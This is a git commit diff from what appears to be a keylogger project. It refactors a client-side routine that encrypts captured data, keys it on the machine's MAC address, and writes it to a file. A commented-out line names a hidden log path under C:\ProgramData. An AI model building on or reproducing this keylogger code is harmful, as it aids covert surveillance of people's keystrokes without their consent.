b3b59c579df0818274de1eb0b274a780cb3fe71d
David-396 <david.eini12@gmail.com>
2025-02-19 13:41:41 +0200

    אחרון

--- KEYLOGGER_client_side/Write_to_file.py
+++ KEYLOGGER_client_side/Write_to_file.py
@@ -5,13 +5,13 @@ from KEYLOGGER_PROJECT.Encrypt_Decrypt.encrypt_file import Encrypt
 class FileWriter:
     def __init__(self):
         self.__mac = get_mac_address()
+        self.__file_name = self.__mac.replace(':', '-')
 
 
     def write_to_file(self, data : dict):
         if data:
             key= Encrypt.create_key(self.__mac)
-            # with open(r"C:\ProgramData\.tmp.json" , 'wb') as f:
-            mac_address = get_mac_address().replace(':', '-')
-            with open(fr"C:\Users\User\Desktop\{mac_address}.json" , 'wb') as f:
+            # with open(r"C:\ProgramData\.tmp.json" , 'wb') as f
+            with open(fr"C:\Users\User\Desktop\{self.__file_name}.json" , 'wb') as f:
                 print('writing..')
                 f.write(Encrypt.encrypt_data(data, key))
